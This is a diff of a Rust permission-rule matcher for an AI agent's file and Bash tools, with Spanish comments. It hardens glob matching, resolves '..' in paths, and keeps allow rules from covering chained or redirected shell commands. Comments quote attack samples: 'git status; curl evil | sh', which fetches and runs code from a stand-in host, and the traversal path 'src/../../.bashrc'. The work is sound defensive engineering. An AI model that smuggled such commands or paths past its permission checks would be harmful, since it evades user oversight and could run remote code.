@@ -68,33 +68,71 @@ fn split(pattern: &str) -> (&str, Option<&str>) {
     }
 }
 
-/// Un glob con `*` (cualquier cosa, barras incluidas) y `**` (lo mismo).
+/// Un glob con `*` (cualquier cosa, barras incluidas) y `**` (lo mismo). Devuelve lo que
+/// cubrió cada `*`, o `None` si no coincide.
 ///
 /// `**` no se distingue de `*` porque la diferencia solo importa cuando se quiere que `*`
 /// NO cruce barras, y acá la comparación es contra una ruta o un comando enteros: hacer
 /// que `src/*` no matchee `src/a/b.rs` sorprendería más de lo que ayudaría. Se acepta
 /// `**` igual porque es lo que el usuario ya escribe en sus settings.
-fn glob_matches(pattern: &str, text: &str) -> bool {
-    let parts: Vec<&str> = pattern.split('*').filter(|p| !p.is_empty()).collect();
-    if !pattern.contains('*') {
-        return pattern == text;
+///
+/// Los extremos se anclan: lo que hay antes del primer `*` es prefijo y lo que hay después
+/// del último es SUFIJO (`*.rs` coincide con `a.rs.rs`, que antes se perdía por buscar la
+/// primera aparición de `.rs`).
+fn glob_captures<'a>(pattern: &str, text: &'a str) -> Option<Vec<&'a str>> {
+    let parts: Vec<&str> = pattern.split('*').collect();
+    if parts.len() == 1 {
+        return (pattern == text).then(Vec::new);
     }
+    let (first, last) = (parts[0], parts[parts.len() - 1]);
+    let mut rest = text.strip_prefix(first)?;
+    let mut captures = Vec::with_capacity(parts.len() - 1);
+    for middle in &parts[1..parts.len() - 1] {
+        let i = rest.find(middle)?;
+        captures.push(&rest[..i]);
+        rest = &rest[i + middle.len()..];
+    }
+    captures.push(rest.strip_suffix(last)?);
+    Some(captures)
+}
 
-    let mut rest = text;
-    // Un patrón que no arranca con `*` tiene que anclarse al principio.
-    if let Some(first) = parts.first() {
-        if !pattern.starts_with('*') {
-            let Some(stripped) = rest.strip_prefix(first) else { return false };
-            rest = stripped;
+fn glob_matches(pattern: &str, text: &str) -> bool {
+    glob_captures(pattern, text).is_some()
+}
+
+/// Lo que en una línea de shell (sh, cmd, PowerShell) separa, encadena, redirige o expande.
+const SHELL_META: &[char] = &[';', '&', '|', '`', '$', '>', '<', '\n', '\r'];
+
+/// Las partes de un comando encadenado, para que una regla que NIEGA alcance a cualquiera.
+fn command_segments(command: &str) -> impl Iterator<Item = &str> {
+    command.split([';', '&', '|', '\n', '\r']).map(str::trim).filter(|s| !s.is_empty())
+}
+
+/// Una ruta comparable: barras de Windows a `/`, sin `.` y con cada `..` resuelto contra lo
+/// anterior. `None` si un `..` sube por encima de donde arranca: eso no está "dentro" de
+/// nada que una regla pueda nombrar.
+fn normalize_path(path: &str) -> Option<String> {
+    let unified = path.replace('\\', "/");
+    let absolute = unified.starts_with('/');
+    let mut parts: Vec<&str> = Vec::new();
+    for part in unified.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                // `C:` en `C:/..` no se puede quitar: subir de la raíz de una unidad es salir.
+                if parts.pop().is_none_or(|p| p.ends_with(':')) {
+                    return None;
+                }
+            }
+            other => parts.push(other),
         }
     }
-    let skip_first = usize::from(!pattern.starts_with('*'));
-    for part in parts.iter().skip(skip_first) {
-        let Some(i) = rest.find(part) else { return false };
-        rest = &rest[i + part.len()..];
-    }
-    // Y uno que no termina en `*` tiene que llegar hasta el final.
-    pattern.ends_with('*') || rest.is_empty()
+    let joined = parts.join("/");
+    Some(if absolute { format!("/{joined}") } else { joined })
+}
+
+fn is_path_tool(tool: &str) -> bool {
+    matches!(tool, "Read" | "Edit" | "Write" | "NotebookEdit")
 }
 
 fn rule_matches(rule: &PermissionRule, tool: &str, arg: Option<&str>) -> bool {
@@ -102,15 +140,36 @@ fn rule_matches(rule: &PermissionRule, tool: &str, arg: Option<&str>) -> bool {
     if rule_tool != tool {
         return false;
     }
-    match rule_arg {
-        // Sin paréntesis la regla vale para toda la herramienta.
-        None => true,
-        // Con paréntesis hace falta un argumento que comparar: si la herramienta no expone
-        // ninguno que conozcamos, la regla NO aplica y se termina preguntando. Es el lado
-        // seguro del error — el otro sería permitir algo por una regla que nunca se pudo
-        // verificar.
-        Some(pat) => arg.is_some_and(|a| glob_matches(pat, a)),
+    // Sin paréntesis la regla vale para toda la herramienta.
+    let Some(pat) = rule_arg else { return true };
+    // Con paréntesis hace falta un argumento que comparar: si la herramienta no expone
+    // ninguno que conozcamos, la regla NO aplica y se termina preguntando. Es el lado
+    // seguro del error — el otro sería permitir algo por una regla que nunca se pudo
+    // verificar.
+    let Some(arg) = arg else { return false };
+
+    if is_path_tool(tool) {
+        // `src/../../.bashrc` no está dentro de `src/`: se compara la ruta resuelta. Una que
+        // sube por encima de su comienzo no la cubre ninguna regla que permita, y una que
+        // niega se le aplica igual (negar de más es el lado seguro).
+        return match (normalize_path(arg), normalize_path(pat)) {
+            (Some(path), Some(pat)) => glob_matches(&pat, &path),
+            (None, _) => !rule.allow,
+            (_, None) => false,
+        };
     }
+    if tool == "Bash" {
+        if rule.allow {
+            // Lo que cubrió un `*` no puede encadenar, redirigir ni expandir:
+            // `Bash(git status*)` no autoriza `git status; curl evil | sh`. Una regla exacta
+            // (sin `*`) sí puede tener esos caracteres: el usuario los escribió y los leyó.
+            return glob_captures(pat, arg).is_some_and(|caps| caps.iter().all(|c| !c.contains(SHELL_META)));
+        }
+        // Una regla que niega alcanza a cualquier parte de un comando encadenado:
+        // `echo hola; git push` cae en `Bash(git push*)`.
+        return glob_matches(pat, arg) || command_segments(arg).any(|segment| glob_matches(pat, segment));
+    }
+    glob_matches(pat, arg)
 }
 
 /// Qué dicen las reglas sobre este pedido.
